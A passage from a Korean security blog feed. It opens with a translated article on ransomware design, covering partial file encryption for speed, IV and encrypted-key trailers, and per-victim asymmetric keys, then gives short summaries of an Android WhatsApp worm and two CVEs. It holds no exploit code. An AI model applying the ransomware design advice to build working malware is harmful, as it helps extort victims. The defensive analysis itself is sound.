&#xC0AC;&#xC6A9;&#xB41C; &#xD0A4;&#xB9CC; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xAC19;&#xC740; &#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC554;&#xD638;&#xD654; &#xACFC;&#xC815;&#xC758; &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB4E0; &#xD0A4;&#xB97C; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xACE0; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="&#xC18D;&#xB3C4;-&#xACE0;&#xB824;"><a href="#&#xC18D;&#xB3C4;-&#xACE0;&#xB824;" class="headerlink" title="&#xC18D;&#xB3C4; &#xACE0;&#xB824;"></a>&#xC18D;&#xB3C4; &#xACE0;&#xB824;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xBAA8;&#xB4E0; &#xD2B9;&#xC9D5;&#xC744; &#xC801;&#xC6A9;&#xC2DC;&#xCF1C; &#xCF54;&#xB529;&#xD55C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#xB9CC;&#xC871;&#xC2A4;&#xB7FD;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. 32&#xBE44;&#xD2B8; &#xD0A4;(AES-256)&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xCD08;&#xAE30; &#xBCA4;&#xCE58;&#xB9C8;&#xD06C;&#xC5D0;&#xC11C; 1&#xBD84;&#xC5D0; 1GB &#xC554;&#xD638;&#xD654; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC654;&#xB2E4;. &#xC774; &#xC18D;&#xB3C4;&#xB294; victim&#xC758; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC758;&#xC874;&#xC131;&#xC774; &#xB192;&#xACE0;, &#xD544;&#xC790;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; VM&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD588;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; 1TB&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294;&#xB370; 16&#xBD84;&#xC774; &#xAC78;&#xB838;&#xB2E4;.</p><p>&#xD604;&#xB300;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB4E4;&#xC740; &#xC5B4;&#xB5BB;&#xAC8C; &#xBA87; &#xAE30;&#xAC00;&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xCD08; &#xB2E8;&#xC704;&#xB85C; &#xC554;&#xD638;&#xD654;&#xD560;&#xAE4C;? &#xC815;&#xB2F5;&#xC740; &#xD30C;&#xC77C; &#xAD6C;&#xC870;(file structure)&#xC5D0; &#xC788;&#xB2E4;.</p><p>&#xC0AC;&#xC2E4;&#xC0C1; &#xD30C;&#xC77C;&#xC758; &#xBAA8;&#xB4E0; &#xBD80;&#xBD84;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xC554;&#xD638;&#xD654;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB2E4;. &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC5D0; &#xB530;&#xB77C; &#xD5E4;&#xB354;&#xC640; initial bytes&#xB9CC; &#xC554;&#xD638;&#xD654;&#xD574;&#xB3C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. &#xC544;&#xB9C8;&#xB3C4; &#xD30C;&#xC77C;&#xC758; &#xCCAB; 5MB&#xB9CC; &#xC554;&#xD638;&#xD654;&#xD558;&#xBA74; &#xB41C;&#xB2E4;. &#xBB34;&#xC2A8; &#xC0DD;&#xAC01;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC54C;&#xACE0; &#xC788;&#xB2E4;. txt/ascii &#xD30C;&#xC77C; &#xAC19;&#xC740; &#xAC04;&#xB2E8;&#xD55C; &#xD30C;&#xC77C;&#xC740; <a href="https://linux.die.net/man/1/strings">strings</a> &#xAC19;&#xC740; &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xADF8;&#xB7F0; &#xD30C;&#xC77C;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; 2kb&#xB97C; &#xB118;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; victim&#xC5D0;&#xAC8C; &#xC911;&#xC694;&#xD55C; &#xD30C;&#xC77C; &#xB300;&#xBD80;&#xBD84;&#xC740; &#xBB38;&#xC11C;, &#xC0AC;&#xC9C4;, &#xBE44;&#xB514;&#xC624;&#xC774;&#xB2E4;. &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xD3EC;&#xB80C;&#xC2DD; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xACE0; &#xB0B4;&#xC6A9; &#xC77C;&#xBD80;&#xB97C; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xAC1C;&#xBCC4;&#xC801;&#xC778; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC218;&#xD589;&#xD558;&#xB294; &#xC218;&#xB3D9;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC774;&#xACE0; &#xD604;&#xC2E4;&#xC801;&#xC774;&#xC9C0; &#xC54A;&#xB2E4;.</p><p>&#xD30C;&#xC77C;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xBD80;&#xBD84;&#xC744; &#xBC14;&#xAFB8;&#xB294; &#xAC83;&#xB3C4; &#xC774;&#xC0C1;&#xC801;&#xC774;&#xBA70; &#xB05D; &#xBD80;&#xBD84;&#xC5D0; 2&#xAC1C;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><ol><li>Initalization vector: AES&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD560; &#xB54C; initialization vector&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;. &#xC774;&#xB294; &#xC554;&#xD638;&#xD654; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2DC;&#xC791;&#xD560; &#xB54C; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;.</li><li>Encrypted decryption key: &#xAC01; &#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC758; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xB2F4;&#xC740; text &#xD30C;&#xC77C;&#xC758; &#xD544;&#xC694;&#xC131;&#xC744; &#xC5C6;&#xC560;&#xC900;&#xB2E4;.</li></ol><p>&#xC774;&#xB7F0; &#xAC83;&#xB4E4;&#xC774; &#xCD94;&#xAC00;&#xB41C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;:</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%202.png" alt></p><p>&#x201C;&#xD30C;&#xC77C;&#xC758; &#xC77C;&#xBD80;&#xB9CC; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xAC83;&#x201D;&#xC758; &#xB610; &#xB2E4;&#xB978; &#xC774;&#xC810;&#xC740; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC6B0;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC0C8; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD560; &#xD544;&#xC694; &#xC5C6;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xB9CC; &#xC788;&#xC73C;&#xBA74; &#xB41C;&#xB2E4;. &#xB610;&#xD55C; 500gb MySQL &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAC19;&#xC740; &#xB9E4;&#xC6B0; &#xD070; &#xD30C;&#xC77C;&#xC744; &#xBE60;&#xB974;&#xAC8C; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;"><a href="#&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;" class="headerlink" title="&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;"></a>&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;</h1><p>&#xAC01; &#xACFC;&#xC815;&#xC5D0; &#xB300;&#xD574; &#xC801;&#xC808;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xBA74; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xB514;&#xC790;&#xC778;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; victim&#xC774; &#xAC19;&#xC740; &#xD0A4;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xB294; &#xAC78; &#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB9C8;&#xB2E4; &#xD0A4;&#xB97C; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD558;&#xB294; process&#xB97C; &#xD3EC;&#xD568;&#xD574;&#xC57C; &#xD55C;&#xB2E4;(&#xD55C; &#xBA85;&#xC774; ransom&#xC744; &#xC9C0;&#xBD88;&#xD558;&#xACE0; key&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xBA74; &#xBAA8;&#xB450;&#xAC00; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC78; &#xBC29;&#xC9C0;&#xD574;&#xC57C;&#xD55C;&#xB2E4;). &#xAC01; victim&#xC5D0; &#xB300;&#xD55C; &#xD0A4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xB3C4; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><p>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xB098;&#xC05C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xCF54;&#xB529;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB3C4; &#xC124;&#xBA85;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xC774; &#xAE00;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xB294; &#xBCF4;&#xC548; &#xD300;&#xB4E4;&#xC774; &#xC774;&#xC804; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC798;&#xBABB;&#xB418;&#xC5C8;&#xACE0;, &#xAC10;&#xC5FC; &#xBC1C;&#xC0DD;/&#xD655;&#xC0B0;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC904; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xB2E8;&#xC77C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xBE44;&#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; ssh-keygen&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><pre><code class="hljs angelscript">ssh-keygen -b <span class="hljs-number">2048</span> -m pem -f pem</code></pre><p>&#xC774; &#xBA85;&#xB839;&#xC5B4;&#xB294; pem &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; public(<code>pem.pub</code>)&#xACFC; private key(<code>pem</code>)&#xC744; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. <code>pem.pub</code>&#xB97C; &#xC644;&#xC131;&#xB41C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xACFC; &#xD569;&#xCCD0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD574;&#xBCF4;&#xC790;.</p><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%203.png" alt></p><blockquote><p>Generating both keys</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%204.png" alt></p><blockquote><p>Public key</p></blockquote><p><img src="/2021/04/11/idioth/arch_of_ransomware_part1/Untitled%205.png" alt></p><blockquote><p>Private key</p></blockquote><p>&#xD30C;&#xD2B8; 1&#xC740; &#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xC774;&#xB2E4;. &#xD30C;&#xD2B8; 2&#xC5D0;&#xC11C;&#xB294; &#xBA40;&#xC6E8;&#xC5B4;&#xB97C; &#xCF54;&#xB529;&#xD558;&#xACE0; &#xC5BC;&#xB9C8;&#xB098; &#xBE60;&#xB974;&#xAC8C; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC2DC;&#xC5F0;&#xD574; &#xBCFC; &#xAC83;&#xC774;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>ransomware</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] WhatsApp을 통해 퍼진 안드로이드 Malware</title>
    <link href="/2021/04/10/fabu1ous/2021-04-10/"/>
    <url>/2021/04/10/fabu1ous/2021-04-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/new-wormable-android-malware-spreads-by-creating-auto-replies-to-messages-in-whatsapp/">WhatsApp Auto-reply Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Android WhatsApp</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Check Point Research&#xAC00; Google Play Store&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; WhatsApp &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC0B0;&#xB418;&#xB294; &#xC545;&#xC131; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC545;&#xC131; &#xC571;&#xC740; Flix Online&#xC774;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; Google Play Store&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xACE0; &#xD53C;&#xD574;&#xC790;&#xC758; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30; &#xC18D; WhatsApp &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xD655;&#xC0B0;&#xB418;&#xB294; &#xC6DC;(Worm)&#xC785;&#xB2C8;&#xB2E4;. Check Point&#xB294; WhatsApp&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC571;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC870;&#xC791;&#xD558;&#xAC70;&#xB098; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC6DC;&#xC744; &#xD601;&#xC2E0;&#xC801;&#xC774;&#xACE0; &#xC704;&#xD5D8;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xC220;&#xC774;&#xB77C; &#xD3C9;&#xAC00;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Flix Online&#xC774; &#xAE30;&#xAE30;&#xC5D0; &#xC124;&#xCE58;&#xB418;&#xBA74; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#x2018;Overlay&#x2019;, &#x2018;Battery Optimization Ignore&#x2019;, &#x2018;Notification&#x2019; &#xAD8C;&#xD55C;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC911; &#xD575;&#xC2EC;&#xC774; &#xB418;&#xB294; &#x2018;Notification&#x2019; &#xAD8C;&#xD55C;&#xC740; Flix Online&#xC774; &#xBAA8;&#xBC14;&#xC77C; &#xAE30;&#xAE30;&#xAC00; &#xBC1B;&#xB294; &#xBAA8;&#xB4E0; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xC54C;&#xB9BC;&#xC5D0; &#xC811;&#xADFC;, &#xB2F5;&#xC7A5;, &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;. Flix Online&#xC740; <code>OnNotificationPosted</code> &#xCF5C;&#xBC31;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC54C;&#xB9BC; &#xD328;&#xD0A4;&#xC9C0;&#xC758;  <code>status.BarNotification0.getPackageName()</code>&#xC744; &#xAC80;&#xC0AC;&#xD574; &#xC54C;&#xB9BC; &#xD328;&#xD0A4;&#xC9C0;&#xC758; &#xADFC;&#xC6D0;&#xC9C0;&#xAC00; WhatsApp&#xC778;&#xC9C0; &#xD310;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xD574;&#xB2F9; &#xC54C;&#xB9BC;&#xC744; &#xC81C;&#xAC70;&#xD568;&#xACFC; &#xB3D9;&#xC2DC;&#xC5D0; &#xC81C;&#xBAA9; &#xBC0F; &#xB0B4;&#xC6A9;&#xC744; &#xD0C8;&#xCDE8;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; Inline reply &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCD94;&#xAC00; &#xAC10;&#xC5FC;&#xC744; &#xC704;&#xD55C; &#xB2F5;&#xC7A5;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xB2EC; &#xB3D9;&#xC548; Flix Online &#xC571;&#xC740; &#xC57D; 500&#xBC88; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB418;&#xC5C8;&#xACE0; &#xD604;&#xC7AC;&#xB294; Google Play Store&#xC5D0;&#xC11C; &#xC0AD;&#xC81C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>malware</tag>
      
      <tag>whatsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-24086: Windows IPv6 denial of service vulnerability </title>
    <link href="/2021/04/09/l0ch/2021-04-09/"/>
    <url>/2021/04/09/l0ch/2021-04-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/analysis-of-a-windows-ipv6-fragmentation-vulnerability-cve-2021-24086.html">Analysis of a Windows IPv6 Fragmentation Vulnerability: CVE-2021-24086</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft&#xAC00; 2&#xC6D4;&#xC5D0; &#xD328;&#xCE58;&#xD55C; Windows&#xC758; IPv6 &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xBD84;&#xC11D; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>IPv6 source node&#xB294; &#xCD5C;&#xB300; &#xC804;&#xC1A1; &#xB2E8;&#xC704;(MTU) &#xBCF4;&#xB2E4; &#xD070; &#xD328;&#xD0B7;&#xC744; &#xBCF4;&#xB0B4;&#xAE30; &#xC704;&#xD574; &#xD328;&#xD0B7;&#xC744; &#xC870;&#xAC01;&#xD654;(Fragmentation)&#xD574; &#xC804;&#xC1A1;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC218;&#xC2E0;&#xD560; &#xB54C; &#xB2E4;&#xC2DC; &#xC870;&#xB9BD;&#xD569;&#xB2C8;&#xB2E4;. Windows&#xC5D0;&#xC11C;&#xB294; IPv6 &#xD328;&#xD0B7;&#xC758; &#xC911;&#xCCA9; &#xC870;&#xAC01;&#xD654;&#xB97C; &#xD5C8;&#xC6A9;&#xD574; &#xC870;&#xAC01;&#xD654;&#xB41C; IPv6 &#xD328;&#xD0B7;&#xC5D0; &#xB2E4;&#xB978; &#xC870;&#xAC01;&#xD654;&#xB41C; &#xD328;&#xD0B7;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;,  &#xC870;&#xAC01;&#xD654;&#xB41C; &#xD328;&#xD0B7;&#xC744; &#xC7AC;&#xC870;&#xB9BD;&#xD558;&#xB294; <code>tcpip!Ipv6pReassembleDatagram</code> &#xC5D0;&#xC11C; NULL &#xD3EC;&#xC778;&#xD130; &#xC5ED;&#xCC38;&#xC870; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC218;&#xC2E0;&#xD55C; &#xC870;&#xAC01;&#xD654; &#xD328;&#xD0B7;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>tcpip!Ipv6pReceiveFragment</code>&#xB294; &#xC911;&#xCCA9;&#xB41C; &#xC870;&#xAC01;&#xD654; &#xD328;&#xD0B7;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xBA74;  <code>tcpip!Ipv6pReassembleDatagram</code>&#xC744; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xD655;&#xC7A5; &#xD5E4;&#xB354;&#xC758; &#xD06C;&#xAE30;&#xB97C; 1500&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD55C; &#xB4A4; <code>NdisGetDataBuffer</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; &#xD328;&#xD0B7; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; <code>NET_BUFFER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xD655;&#xC7A5; &#xD5E4;&#xB354; &#xD06C;&#xAE30; + &#xD328;&#xD0B7; &#xD5E4;&#xB354; &#xD06C;&#xAE30;(<code>0x28</code> &#xACE0;&#xC815;)&#xB9CC;&#xD07C;&#xC744; &#xC77D;&#xC5B4; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC911;&#xCCA9;&#xB41C; &#xC870;&#xAC01;&#xD654; &#xD328;&#xD0B7;&#xC758; &#xD655;&#xC7A5; &#xD5E4;&#xB354;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD655;&#xC7A5; &#xD5E4;&#xB354; &#xD06C;&#xAE30;&#xAC00; <code>0xffd0</code>&#xBA74;<code>NdisGetDataBuffer</code> &#xD568;&#xC218;&#xB294; <code>0xffd0 + 0x28(&#xD328;&#xD0B7; &#xD5E4;&#xB354;) = 0xfff8</code> &#xD06C;&#xAE30;&#xB9CC;&#xD07C; &#xC77D;&#xACE0; NULL&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xBC18;&#xD658;&#xB41C; NULL &#xAC12;&#xC744; <code>tcpip!Ipv6pReassembleDatagram</code> &#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD558;&#xAC8C; &#xB418;&#xACE0; NULL &#xD3EC;&#xC778;&#xD130; &#xC5ED;&#xCC38;&#xC870; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC545;&#xC131; UDP &#xD328;&#xD0B7;&#xC744; IPv6&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>denial of service</tag>
      
      <tag>null pointer dereference</tag>
      
      <tag>ipv6</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3483: Linux kernel의 nosy driver에서 발견된 UAF bug</title>
    <link href="/2021/04/08/insu/2021-04-08/"/>
    <url>/2021/04/08/insu/2021-04-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/10">CVE-2021-3483: Linux kernel: a use-after-free bug in nosy driver</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux Kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux Kernel&#xC758; <code>Linux/drivers/firewire/nosy.c</code>&#xC5D0;&#xC11C; UAF &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Nosy&#xB294; IEEE 1394 &#xB4DC;&#xB77C;&#xC774;&#xBC84;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB610;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xACFC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBD84;&#xC11D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; IEEE 1394 &#xD328;&#xD0B7; &#xC2A4;&#xB2C8;&#xD37C;&#xC774;&#xBA70; nosy driver&#xB294; &#xAC01;&#xAC01;&#xC758; device&#xC5D0;&#xC11C; <a href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/structpcilynx.html">pcilynx structure</a>&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; nosy driver&#xAC00; device&#xC5D0; pciynx structure&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; 